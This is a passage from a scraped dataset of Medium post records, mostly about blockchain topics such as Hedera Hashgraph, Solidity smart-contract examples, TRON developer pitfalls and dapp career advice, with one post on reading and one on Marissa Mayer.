the information we grasp for quickly slips through our fingers.Try not to take this the wrong way, but before you fill your day with articles that largely promulgate your ego, try picking up a difficult book instead.You might just learn something.If you enjoyed what you read, please click the heart \u2764 and give that big red button above a click to get my weekly newsletter! \u2014 Michael", "responses": 0, "tags": ["Reading", "Books", "Medium"]}, {"title": "", "post_link": "https://medium.com/@nderground_net/a-lot-of-people-would-disagree-with-this-characterization-of-marissa-mayer-as-well-respected-at-6647bf17d8c2?source=search_post", "author_name": "nderground", "author_link": "https://medium.com/@nderground_net", "publish_date": "2017-07-01", "last_modified_date": "2018-01-28", "readtime": "0.54", "claps": 2, "voters": 2, "content": "ndergroundFollowJul 1, 2017 \u00b7 1 min readA lot of people would disagree with this characterization of Marissa Mayer as \u201cwell respected\u201d, at least when it comes to running a business. Her time at Yahoo did not exactly cover her in glory, although in typical CEO fashion she is walking away with a huge pile of money.Uber has the solidity of a house of cards, so it would be a challenge for anyone to move the company forward. But looking at Marissa Mayer\u2019s performance at Yahoo, I think that she would be the kiss of death for the company. I doubt that she would be the person the board would choose, since they are mostly Venture Capitalists who are desperate to get their money back. This means cleaning up the balance sheet and taking Uber public. I don\u2019t think that the markets would be welcome Marissa Mayer after the Yahoo debacle.", "responses": 0, "tags": []}, {"title": "The Ethereum Challengers, ep. 9: Hedera Hashgraph", "post_link": "https://medium.com/@icoalert/the-ethereum-challengers-ep-9-hedera-hashgraph-406e75bea2a8?source=search_post", "author_name": "ICO Alert", "author_link": "https://medium.com/@icoalert", "publish_date": "2018-10-18", "last_modified_date": "2018-10-19", "readtime": "12.1", "claps": 3, "voters": 1, "content": "The Ethereum Challengers, ep. 9: Hedera HashgraphICO AlertFollowOct 18, 2018 \u00b7 13 min readNon-blockchain distributed ledger with fast consensus, finality, Solidity, fork resistance, and a governance council of 39 organizationsBlockchains are distributed ledgers, but not all distributed ledgers are blockchains.Hedera Hashgraph, developed by Swirlds, is a distributed ledger, but not a blockchain. It will continue to be referred to as a project in the \u201cblockchain space,\u201d and that\u2019s OK thanks to our good old friend synecdoche.The hashgraph consensus mechanism shows a couple of similarities to IOTA. I discussed IOTA briefly in Six Quantum-Resistant Cryptocurrencies. IOTA\u2019s not a blockchain, but it is a distributed ledger: a Directed Acrylic Graph affectionately named the Tangle.Both attempt a trustless setup without requiring all nodes to be aware of all transactions before processing a new transaction.This enables a breed of parallelism, where transactions don\u2019t need to be sequentially processed.Our veteran cryptography and blockchain testers Alice and Bob can perform transactions at the same time and have them verified more quickly since they don\u2019t need to wait on each other in order to be processed. This results in dramatically improved performance: Nodes don\u2019t need to wait for the latest, greatest chain information in order to help verify transactions, and they don\u2019t need to all race to process the same transaction.A rare glimpse of Alice and Bob, who have been testing secure methods of exchange for many decades.I heard about Hedera\u2019s hashgraph project early on, when their social following was little more than a handful of people.The same excitements \u2014 and the same concerns \u2014 followers had for the platform in the early days are still the major thoughts expressed by Hashgraph fans and critics.\u201cHedera\u201d is the platform, and \u201cHashgraph\u201d a description of how it works \u2014 sort of like how we say \u201cthe Ethereum blockchain,\u201d we say \u201cHedera Hashgraph.\u201d But the Hashgraph technology used by Hedera is unlikely to be used by many other platforms in the future.We\u2019ll talk below about how Hedera fights forks of its platform, including with patents and with code that is open review but not open source. But we\u2019ll also talk about the advantages Swirlds, the company developing and launching Hedera Hashgraph, has over competitors.\u201cThey will not require any license or any approval from Hedera\u201d (from the v1.3 whitepaper synopsis).In general, I agree with the direction the Hashgraph whitepaper comes from, so I might be quoting it more often here than usual.It\u2019s worth seeing the problems Hashgraph intends to solve, since they often overlap with the concerns everyone has with other smart contract platforms. The following section is quoted entirely from the Hashgraph whitepaper, but emphasis is mine. In fact, all quotations in this article, unless otherwise noted, are from the v1.3 whitepaper.PERFORMANCEThe most compelling use cases require hundreds of thousands of transactions per second in a single shard (perhaps millions of transactions per second (tps) in a fully-sharded solution), and many require consensus latency measured in seconds. These performance metrics are orders of magnitude beyond what current public DLT platforms can achieve.SECURITYIf public platforms are to facilitate the transfer of trillions of dollars of value, we have to expect them to be targeted, and we have to prepare for this. To do so requires a consensus algorithm that provides the best security one can achieve, with the security properties of the algorithm formally proven. Vectors of security vulnerabilities shouldn\u2019t be mitigated; they should be eliminated entirely. Other public DLT platforms are trading off decentralization (and so potentially compromising security) for performance gains.GOVERNANCEA general-purpose public ledger should be governed by representatives from a broad range of market sectors, each with world-class expertise in their respective industries, and also selected to provide global geographic representation for all markets. Those that are governing need technical expertise so they can competently manage the technical roadmap. They need business expertise so they can manage business operations of the organization. They need expertise in economics and currency markets so they can manage the cryptocurrency. They need legal expertise to help navigate the evolving regulatory environment. In other words, governance should be by those globally recognized as world leaders in their respective industries, and representative of every market in the worldSTABILITYWithout technical and legal mechanisms to enforce the decisions of the governing body, public platforms are at risk of devolving into chaos. Strong security and mature governance will enable a stable platform \u2014 one that engenders the necessary trust and confidence among those that would build commercial or sensitive applications on it.REGULATORY COMPLIANCEWe expect that governments will continue to increase oversight of public ledgers and associated cryptocurrencies and tokens. We consider that a distributed public ledger must be capable of enabling appropriate Know Your Customer (KYC) and Anti Money Laundering (AML) checks.In general, these are indeed the major issues facing dapp/smart contract platforms today. Some more anarchist readers might take issue with the Regulatory Compliance point, even though \u201ccapable of enabling\u201d can hardly mean \u201cenforce.\u201d Others with commitments to purer forms of democracy won\u2019t like the Governance point.However, in both cases I\u2019d argue that these readers\u2019 concerns aren\u2019t as concerning as they seem.How does Hedera Hashgraph achieve VISA+ transaction speed?On the hashgraph, when I have a transaction verified, I don\u2019t need to communicate it to every node in the world. Yet this doesn\u2019t reduce the confidence of untalked-to nodes in the consensus, since nodes that receive transactions from a little while back end up with the whole hashgraph and have enough information to know how they would have voted.Removing the necessity for all nodes in the world to receive and confirm the latest information dramatically improves performance. It\u2019s similar to how office gossip can be a more efficient way to propagate some kinds of information than company-wide assemblies.Many blockchain systems reduce the number of nodes you need to communicate with for each block by actually reducing the number of nodes verifying on the network, like EOS with its (1)21 block producers. Hashgraph reduces the number of nodes that need to be communicated with, but not by reducing the total number of participating nodes.When Alice talks to Bob, she not only tells Bob of new transactions but also \u201cgossip about gossip,\u201d telling Bob everything she knows so far. As information randomly propagates around the hashgraph, everyone is continually brought up to date. Nodes are never very far behind. When veteran Bob tells Carol about some new transactions, he also communicates everything Alice told him, so Carol is then up to date. Soon enough, the new transactions included by Bob will be communicated back to Alice as the hashgraph continues its random propagation.It\u2019s worth noting that the hashgraph\u2019s throughput is untested on public networks and has only achieved its performance specs on private networks. How much the transition to public net will affect performance remains to be seen.FinalityBitcoin transactions aren\u2019t ever quite final.You\u2019ve noticed that transfers to cryptocurrency exchanges have a required number of confirmations \u2014 blocks on top of the block containing the transfer \u2014 before funds are availables. Sometimes this is 1 or 2 confirmations, but usually it\u2019s 3 or 6. Exchanges are confident enough in the transaction.Hashgraph boasts finality, meaning that there is a point where confidence is mathematically 100%. Most blockchains approach 100% but never quite hit it.Not that this is a reason for FUD. 99.99999999999999% is practically quite similar to 100%. But it does replace the arbitrary waits for confirmation with something concrete.As if we can ever really have 100% confidence in anything.\u201cFair\u201d = \u201cFirst Come, First Served\u201dNor are Bitcoin transactions fair, by Hashgraph\u2019s definition of fairness.Suppose there\u2019s a piece of art up for purchase.Our veterans Alice and Bob, weary from their endless testing of every transaction for every whitepaper in existence, each want to spruce up their testing chambers with something profoundly non-digital. Alice buys the artwork with a Bitcoin transaction. Bob buys it a few seconds later. Miners can arbitrarily choose which transaction to include first, meaning that Bob might end up, for the first time in his life, beating Alice to the punch at something involving a crypto transaction.That\u2019s arguably not fair. On Hashgraph, transactions have a timestamp by consensus, which reflects (by averaging) the time \u201cwhen the majority of the network members received that transaction.\u201dAs the whitepaper continues, \u201cthis consensus timestamping is useful for things such as a legal obligation to perform some action by a particular time. There will be a consensus on whether an event happened by a deadline, and the timestamp is resistant to manipulation by an attacker.\u201dIt might not be fair to describe fairness as binary. Two transactions days apart won\u2019t get swapped in order by the Bitcoin network, and two transactions milliseconds apart might get flipped by the Hashgraph network, though not intentionally. But in practical life, the ordering of transactions is fairer in Hashgraph than in a number of systems.Separation of Governance and ConsensusNow, it\u2019s time to talk about some of the concerns Hashgrapites (Hashgraphics? Hashgraphenes?) face when they talk about Hedera Hashgraph with their crypto friends.Among those concerns is the Hedera Hashgraph Council, which really sounds like something out of Netrunner.Hedera\u2019s consensus model, unlike many dPoS, dBFT, and similar systems like EOS and NEO, is not restricted to a smaller council of nodes. I plan to run a Hashgraph node at home and earn some Hashgraph once the network is out, but I don\u2019t ever plan to produce EOS blocks.Governance, however, is restricted to a council. Swirlds will license Hedera Hashgraph out to the council, in exchange for \u201c10% of revenue (with monthly minimums) and Swirlds [owning] 5% of Hedera coins.\u201d Council members, with the exception of Swirlds, will have term limits, and the council will vote in additional council members.The HHC \u2014 since the space doesn\u2019t have enough three-letter acronyms yet \u2014 will be made up of 39 organizations. I heard about plans for the council first-hand at a Hashgraph meetup in New York, and it\u2019s my understanding that a number of companies have been approached, and some have responded, selected for geographical diversity, diversity of industry, and potential reputation loss (to economically discourage them from messing with Hashgraph governance to further their own ends).Let\u2019s do a rapid-fire round of short sections highlighting some Hedera Hashgraph features.Fork Off!Forking Swirlds\u2019s Hedera Hashgraph code is legally difficult, as the codebase is patented. This isn\u2019t closed-source, since the code is open review, but Swirlds plans to aggressively pursue violators of their patent legally.Of course, the crypto space includes enough hackers and anarchists that we cannot eliminate the possibility that some project will anonymously fork the code, but Swirlds would pursue companies using the fork, so adoption would probably be limited.According to the whitepaper, forks of the hashgraph (\u201cchain splits,\u201d to carry over blockchain lingo) are possible, but they must have a new genesis block. No client can be deceived into thinking the fork is the original Hashgraph chain. Even a 50/50 split would end with neither graph being able to include anything between the original hashgraph genesis and the fork. So, splits can happen, but not in a deceptive fashion.Liberty, Identity, SolidityHashgraph will allow for identity information by providers to be linked to accounts (even temporarily). While the hashgraph won\u2019t have KYC or de-anonymization built in, users that need to verify their identity for a company, bank, government agency, etc. will ultimately be able to do so.Another potential advantage of Hedera Hashgraph is that it will, on launch, run Solidity contracts. Ethereum projects can easily move over.Staking and Proxy Staking HashgraphIt seems that running hashgraph nodes will be easy, since old hashgraph data can be discarded by nodes, reducing the memory required, and since hashgraph verification relies on randomness and stake rather than proof of work.\u201cWhen the Hedera platform is running at scale, any user will be able to run a node in the network and earn cryptocurrency payments for doing so.\u201dHedera Hashgraph also introduces proxy staking, where a user who wants to stake but does not want to run a node can delegate their stake to a node. The node and user providing the staked tokens can negotiate the way they split profits.Storing Files in the HashgraphWe\u2019re moving through features quickly here, but Hedera Hashgraph will also include file storage. \u201cEvery node in the shard stores the same files, so they will not be lost if one of the nodes crashes. Stored information can only be deleted by those that were given permission.\u201d Nodes will actually store files, and to my knowledge it remains to be seen how much of a storage requirement this imposes on the nodes.It does seem that the file storage system will be easy to work with, both secure and flexible. \u201cWe give developers Java code to manipulate a Merkle tree as if it were a file system \u2026 A file can be accessed by its hash, so people can rely on the fact that it is immutable. But it also has a File ID.\u201dWhen you store a file on the hashgraph, you can verify its immutability with the hash, proving it hasn\u2019t been modified since a certain time, but you can also allow for easy revisions via the file ID, which tracks a file even if it\u2019s been modified.Sharding (Again)Many projects have discussed sharding to improve blockchain performance. Borrowed from conventional databases, sharding basically splits a chain into sub-chains that are semi-independent parts of the whole. It\u2019s an explicit kind of parallelism, and one that Ethereum and a number of other projects plan. However, secure implementation of sharding for a distributed ledger hasn\u2019t been proven yet.Sharding reduces the number of nodes on each shard, and thus reduces the stake required to attack the network. Assuming malicious actors need to achieve 31% of the network in order to attack it, that 31% is much easier to obtain for a shard. Because of this and the complexity of implementing sharding, no project to my knowledge has taken any steps towards sharding in their live product.Projects on HashgraphHedera Hashgraph did run a sale round open to accredited investors, and SAFT investments are still available.Some projects partnering with Hedera for their ongoing mainnet rollout are running token sales this year. Hedera Hashgraph has announced a number of these projects, but to my knowledge the only sale currently open at this writing is hearo.fm.Hearo.fm pays micropayments directly from music listeners to music artists. The platform\u2019s move to Hedera Hashgraph will take advantage of the hashgraph\u2019s speed to make their project a decentralized, scalable potential solution for many of the problems currently wracking the music industry.Other early HH partners include real estate project Red Swan and MZ, the creators of Game of War.Now, let\u2019s summarize Hashgraph vs. Ethereum by asking the same questions the series has followed in each installment so far.1) ScalabilityAs with most solutions that currently promise scalability, Hedera Hashgraph is not based on a proof-of-work consensus model. However, unlike most of these solutions, consensus is not restricted to a small circle of some variant of supernodes. Hedera Hashgraph is not yet live, but tests exceed VISA\u2019s transaction throughput. It remains to be seen how well the hashgraph performs in practice, but it will clearly be orders of magnitude faster than Ethereum.2) GovernanceGovernance is separate from consensus. Consensus is decentralized, but governance is conducted by the 39-member Hedera Hashgraph Council. Members besides Swirlds, the developer of Hedera Hashgraph, are diverse organizations with limited terms on the council and with immense reputation to lose if they act in their own interests and against the interests of the network.3) Development ComplexityHedera Hashgraph will launch with support for Solidity smart contracts, so development complexity is on par with Ethereum. I haven\u2019t yet seen information on how easy or difficult it is to update these contracts or on what development resources for Ethereum will be usable on or portable to HH development.4) TimelineThe public hashgraph is live, with support for the cryptocurrency, file storage, and Solidity smart contracts. APIs are live, as well, and other features are currently rolling out. Users will be able to create new accounts within the next 4 months.5) Generalized FeaturesHedera Hashgraph offers file storage and plans to offer support for secure identity on the platform.6) AdoptabilityTransaction fees are small but still existent. However, fees are split into several categories, so a large portion is refundable in case of transaction failure for whatever reason. I suspect applications will abstract fees away from the user, much as will likely happen with Ethereum (and has already happened with Peepeth, which no longer even requires an Ethereum account to be used).7) Market PositionHedera Hashgraph has been building buzz for a number of months now. Unless significantly more funds are raised, HH is significantly behind Ethereum and even EOS and some other alternatives in terms of developer interest, funding, and toolset. However, sooner or later the success of platforms will depend not on hype and on actual usage, so the development of killer applications that take advantage of Hedera Hashgraph\u2019s capabilities is the platform\u2019s chance to make gains on the competition.The next Ethereum Challenger we\u2019ll consider is IOST, Internet of Services Token. It\u2019s seen significant interest in the past couple of months. Is it a rip-off of EOS? Or an improvement? We\u2019ll discuss that in a couple of weeks.Originally published at media.icoalert.com.", "responses": 0, "tags": ["Blockchain", "Distributed Ledgers", "Cryptocurrency", "Ethereum", "Ethereum Blockchain"]}, {"title": "Code Pattern: Blockchain Voting \u2014 Develop a voting application with hyperledger and ethereum", "post_link": "https://medium.com/@IBMDeveloper/code-pattern-blockchain-voting-develop-a-voting-application-with-hyperledger-and-ethereum-6cdb3cb1d657?source=search_post", "author_name": "IBM Developer", "author_link": "https://medium.com/@IBMDeveloper", "publish_date": "2018-12-17", "last_modified_date": "2018-12-18", "readtime": "0.54", "claps": 10, "voters": 1, "content": "Code Pattern: Blockchain Voting \u2014 Develop a voting application with hyperledger and ethereumIBM DeveloperFollowDec 17, 2018 \u00b7 1 min readThis code pattern shows you how to build a decentralized application that invokes methods on a Solidity smart contract running in Hyperledger Fabric. It includes a Fabric proxy server that translates Web3 calls to and from a running Hyperledger Fabric and Chaincode Ethereum Virtual Machine (EVM) combined framework that enables the deployment of these smart contracts.DescriptionThis decentralized voting application is a simple app that uses Hyperledger Fabric Network and Chaincode EVM to compile Web3 and Solidity smart contract deployments.Developers who are more familiar with Ethereum tools and coding can apply their knowledge of Ethereum on the Hyperledger infrastructure.Once you\u2019ve completed this code pattern, you will understand how to use both permissioned (Hyperledger) and permissionless (Ethereum) blockchain frameworks together.You can see the full code pattern on IBM Developer.", "responses": 0, "tags": ["Blockchain", "Ethereum", "Hyperledger"]}, {"title": "", "post_link": "https://medium.com/@socrates1024/in-my-opinion-this-isnt-any-different-than-reentrancy-at-least-the-way-i-used-it-when-first-53c0308a0289?source=search_post", "author_name": "Andrew Miller", "author_link": "https://medium.com/@socrates1024", "publish_date": "2016-09-08", "last_modified_date": "2018-03-06", "readtime": "0.29", "claps": 0, "voters": 0, "content": "A security issue with Ethereum\u2019s Solidity language, not just the DAO1349Muneeb AliAndrew MillerFollowSep 8, 2016 \u00b7 1 min readIn my opinion, this isn\u2019t any different than \u201creentrancy\u201d, at least the way I used it when first pointing out this problem in 2014.MediumEdit descriptionblog.blockstack.orgWhen I illustrated this with an example, Solidity didn\u2019t exist and Serpent have \u201cfunctions.\u201d But my example was logically broken into different functions indicated with a command byte, and it involved different functions just like you explained. Reentrancy at the *contract* level is essential for the problem involving shared state.", "responses": 1, "tags": []}, {"title": "Ethereum Smart Contract Support in Bluzelle\u2019s Lovelace Release", "post_link": "https://blog.bluzelle.com/ethereum-smart-contract-support-in-bluzelles-lovelace-release-f8ff22a2b906?source=search_post", "author_name": "Bluzelle", "author_link": "https://blog.bluzelle.com/@Bluzelle", "publish_date": "2018-08-14", "last_modified_date": "2018-08-14", "readtime": "1.94", "claps": 0, "voters": 0, "content": "Ethereum Smart Contract Support in Bluzelle\u2019s Lovelace ReleaseBluzelleFollowAug 14, 2018 \u00b7 2 min readWith Ethereum Solidity smart contracts, the key idea is to write a smart contract that employs the Bluzelle libraries to make CRUD requests. These requests get routed through Oracalize through to the swarm and then responses are sent back through Oracalize to your smart contract. It is important then to implement a listener to process the responses. This asynchronous request-response pattern is how your Ethereum dApp should be structured.In your dApp, make sure you are importing the bluzelle.sol file from:https://github.com/bluzelle/bluzelle-sol/blob/master/contracts/BluzelleClient.solPlease note that BluzelleClient smart contract can always be modified if the user wishes to have a more robust or more secured dapp.The BluzelleClient contains all the expected CRUD operations that are needed to talk to a Bluzelle swarm. One simply imports this utility smart contract, and calls any of the four functions: read(string key), remove(string key), set(string key, string data), update(string key, string data) and create(string key, string data).The file SampleDapp.sol:https://github.com/bluzelle/bluzelle-sol/blob/master/contracts/SampleDapp.solshowcases how to use these four functions to communicate data with the bluzelle swarm:/* Read the value from Bluzelle (this requires a small fee to pay Oracalize) */Function getValue(string _key) onlyOwner public payable{     read(_key);}/* Set the value */function set(string _key, string _value) onlyOwner public payable{     update(_key, _value);}/* Create new KVP */function add(string _key, string _value) onlyOwner public payable{     create(_key, _value);}/* Remove a KVP */function eliminate(string _key) onlyOwner public payable{    remove(_key);}You may notice that all four functions have the payable keyword in their declaration. This is to indicate that these four functions require a fee in ETH in order for Oracalize servers carry out the data request to the Bluzelle swarm.For example, to create a new key-value pair, simply execute the add(key, value) in your dApp, and send (for example) 0.002 eth in the transaction. Provided this amount is at least as much as Oracalize\u2019s fee requirements for such a transaction, the request will be made to the swarm. If the amount of ETH transferred is actually more than Oracalize\u2019s fee requirements, then a portion of the amount sent is accepted and the rest is returned back to your dApp contract. The user is free to simply execute the retrieveETH function to retrieve unused ETH, as per the example.Once a CRUD operation is executed, and data is sent to or requested from the swarm, one simply has to wait for the __callback function to be executed by Oracalize. In the dApp, one can modify the __callback function in whatever way they wish, for the data to be handled appropriately.The developer can decide whether to change the state of business logic within the smart contract, or simply emit an event. Please see SampleDapp.sol, SampleDappPublic.sol and Bluzelle.sol for a real such example:https://github.com/bluzelle/bluzelle-sol/tree/master/contractsInterested developers are free to try out an already deployed dApp available for the general public. Simply go to:https://www.myetherwallet.com/#contractsand select the Ropsten network. Then use the contract address:0xeA6Fa8C8e59FFc5B0DffF1613B7D09e7617b9FD4and the following abi:[{\"constant\":true,\"inputs\":[],\"name\":\"last_value_read\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_uuid\",\"type\":\"string\"}],\"name\":\"changeUUID\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"myid\",\"type\":\"bytes32\"},{\"name\":\"result\",\"type\":\"string\"}],\"name\":\"__callback\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"changeOwnership\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"myid\",\"type\":\"bytes32\"},{\"name\":\"result\",\"type\":\"string\"},{\"name\":\"proof\",\"type\":\"bytes\"}],\"name\":\"__callback\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_key\",\"type\":\"string\"}],\"name\":\"eliminate\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"current_uuid\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"last_result_received\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"apiCreate\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"last_key_used\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_key\",\"type\":\"string\"}],\"name\":\"getValue\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"keyExists\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_url\",\"type\":\"string\"}],\"name\":\"changeURL\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"retrieveETH\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"apiRemove\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_key\",\"type\":\"string\"},{\"name\":\"_value\",\"type\":\"string\"}],\"name\":\"set\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_key\",\"type\":\"string\"},{\"name\":\"_value\",\"type\":\"string\"}],\"name\":\"add\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"apiRead\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"apiUpdate\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"name\":\"_uuid\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"prevOwner\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipChanged\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"name\":\"_action\",\"type\":\"string\"},{\"indexed\":false,\"name\":\"_key\",\"type\":\"string\"},{\"indexed\":false,\"name\":\"_response\",\"type\":\"bool\"},{\"indexed\":false,\"name\":\"_timestamp\",\"type\":\"uint256\"}],\"name\":\"swarm_response\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"name\":\"_key\",\"type\":\"string\"},{\"indexed\":false,\"name\":\"_value\",\"type\":\"string\"},{\"indexed\":false,\"name\":\"_timestamp\",\"type\":\"uint256\"}],\"name\":\"swarm_read\",\"type\":\"event\"}]", "responses": 0, "tags": ["Ethereum"]}, {"title": "", "post_link": "https://medium.com/@davekaj/hey-kamran-c63f9892e109?source=search_post", "author_name": "Dave Kajpust", "author_link": "https://medium.com/@davekaj", "publish_date": "2019-07-28", "last_modified_date": "2019-07-28", "readtime": "0.33", "claps": 0, "voters": 0, "content": "Hi Dave, I am a freelancer mobile developer and have been working for the last 2 years.1Kamran BashirDave KajpustFollowJul 28 \u00b7 1 min readHey Kamran,If you learn Solidity and still focus on mobile development, that would be good. Solidity and mobile and web all go together.If you really truly are interested in blockchain and put in the effort, you will find a good job in the end. Right now there is a demand for blockchain developers, and not many people are willing to put in the hard work and effort to learn! So if you do it, you will get a job. But it will be hard work :) !", "responses": 0, "tags": []}, {"title": "", "post_link": "https://medium.com/@davekaj/maybe-my-first-comment-wasnt-totally-clear-4041d30c8797?source=search_post", "author_name": "Dave Kajpust", "author_link": "https://medium.com/@davekaj", "publish_date": "2018-11-05", "last_modified_date": "2018-11-05", "readtime": "0.74", "claps": 0, "voters": 0, "content": "This is why I like medium so much. Humans write to help and the best ones gets searched easily.1Kushal V. MahajanDave KajpustFollowNov 5, 2018 \u00b7 1 min readMaybe my first comment wasn\u2019t totally clear! The web development expereience won\u2019t help with the three core computer science things I mentioned.It is just that you will more easily get hired if you know web dev and solidity, rather than trying to teach yourself cryptography or distributed computing or mechanism design is going to take longer, because you have to learn how to design these and people rely on them to be rightCoding, is about implementing. Meaning someone else is designing the mechanism, or choosing cryptography to use in the blockchain, and the coder just needs to write the code. It is easier because you can iterate, get help, and test that it is correct.2. A dapp is essentially a normal front end, often built with react and truffle, and the backend is the blockchain. Sometimes dapps have their own indexed backends, but it is only for performance and not necessart3. Business model for dapps isn\u2019t figured out. Almost no dapps are making money. A lot a burning though capital. But, one day, financial dapps will be very big. It is just far away and not too clear how we will get there.", "responses": 1, "tags": []}, {"title": "TRON Developer Guide\u2014Timeout and Infinite Loop Pitfalls", "post_link": "https://medium.com/@Tronfoundation/tron-developer-guide-timeout-and-infinite-loop-pitfalls-28ce8ce5c64a?source=search_post", "author_name": "TRON Foundation", "author_link": "https://medium.com/@Tronfoundation", "publish_date": "2019-06-03", "last_modified_date": "2019-06-03", "readtime": "0.72", "claps": 9, "voters": 4, "content": "TRON Developer Guide\u2014Timeout and Infinite Loop PitfallsTRON FoundationFollowJun 3 \u00b7 1 min readIf a complex Solidity contract deploys on the TRON network, there is a probability the execution times out, causing the user to consume all energy from the account up to the fee limit. The maximum amount of CPU time allowed per transaction is 50 ms (adjustable network parameter #14 here), resulting in a maximum of 50,000 Energy consumed before timing out (1 Energy = 1 Microsecond). Note that this number is actually ~250,000 Energy due to maxTimeRatio = 5.0 set on SR nodes relaxing the upper timeout for different machine configurations. OUT_OF_ENERGY failures may incur higher than 250,000 Energy due to penalties.To avoid timeout executions, try to break large contracts into smaller chunks, and reference each other as needed. To avoid infinite loops, watch for common pitfalls and recursive calling.", "responses": 0, "tags": ["Tron", "Tronnews"]}, {"title": "", "post_link": "https://medium.com/@gus_tavo_guim/passing-the-address-of-the-token-and-changing-ownership-are-two-different-things-2407a31d04f?source=search_post", "author_name": "Gustavo (Gus) Guimaraes", "author_link": "https://medium.com/@gus_tavo_guim", "publish_date": "2018-03-14", "last_modified_date": "2018-03-14", "readtime": "0.20", "claps": 7, "voters": 1, "content": "I am confused by the step \u201cchange token ownership to crowdsale so it is able to mint tokens during\u20261Colin SheppardGustavo (Gus) GuimaraesFollowMar 14, 2018 \u00b7 1 min readPassing the address of the token and changing ownership are two different things.In MintableToken (https://github.com/OpenZeppelin/zeppelin-solidity/blob/master/contracts/token/ERC20/MintableToken.sol) only allows contract owner to create tokens. Therefore we need to transfer ownership of the token contract to the crowdsale contract. Otherwise it won\u2019t work and when sending transaction to the crowsale contract it will throw an exception.", "responses": 1, "tags": []}, {"title": "GoNetwork Tutorial \u2014 Welcome to the first of a series of technical blog posts from GoNetwork.", "post_link": "https://keepingstock.net/pocket-tutorial-welcome-to-the-first-of-a-series-of-technical-blog-posts-from-gonetwork-58476c287c91?source=search_post", "author_name": "GoNetwork", "author_link": "https://keepingstock.net/@gonetwork", "publish_date": "2017-10-20", "last_modified_date": "2018-06-18", "readtime": "5.70", "claps": 1115, "voters": 319, "content": "GoNetwork Tutorial \u2014 Welcome to the first of a series of technical blog posts from GoNetwork.GoNetworkFollowOct 20, 2017 \u00b7 6 min readGoNetwork with other winners and founders at EthWaterlooFirst a little background on how we got here.ETHWaterloo represented the largest global Ethereum hackathon with participants coming from 32 countries. The 32 hour hack was judged by such notable names in the blockchain community including; Vitalik Buterin, Jeff Coleman, Brian Bondy, Joseph Lubin, Dmitry Buterin to name a few. Our submission Pocket won! We managed to produce a mobile-first bluetooth based tap and pay system using the Ethereum blockchain. We were the only native mobile product amongst the 400 participants.Pocket by GoNetwork, named after pocket change, aims to solve a problem with financial literacy by implementing gamification, parental controls and transparency for youth leveraging the Ethereum blockchain. The offering allows parents to create assignable digital debit cards and claimable rewards for good behaviour such as decreased spending month to month and controlled spending across different categories (food,entertainment, etc.).You can check out our entry at: https://devpost.com/software/pocket-t1fmg5.Our belief is in order for blockchain to reach consumer markets, mobile developers need to start adopting the technology. The goal of this and proceeding tutorials draws on our experience and should get mobile devs to a point of prototyping. As GoNetwork grows we will continue to contribute tools and tutorials to the developer community.This tutorial is based on a hackathon entry i.e. no code audits; as such this is not production quality code. That being said, lets get started.You\u2019ll need the following tools installed, I list my version numbers alongside:node v7.9.0 & npm 4.2.0bower 1.8.2react-native 0.49.3 and react-native-cli 2.0.1xcode 8.2.1testprc 